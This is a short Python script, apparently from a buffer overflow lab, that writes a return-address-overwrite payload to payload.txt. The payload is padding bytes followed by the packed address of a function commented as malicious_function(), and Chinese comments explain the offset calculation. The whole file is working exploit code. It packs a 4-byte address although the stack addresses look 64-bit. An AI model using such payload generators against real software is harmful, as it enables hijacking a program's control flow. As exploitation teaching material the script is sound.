def p32(address):
    return address.to_bytes(4, byteorder='little')


if __name__ == "__main__":
    target_address = 0x40119e                   # malicious_function() 的函数入口地址
    offset = 0x7fffffffd038 - 0x7fffffffcff0    # 返回地址和 buffer[] 首地址之间的距离

    payload = b"A" * offset + p32(target_address)

    with open("payload.txt", "wb") as f:
        f.write(payload)

    print(f"Payload written to payload.txt: {payload}")
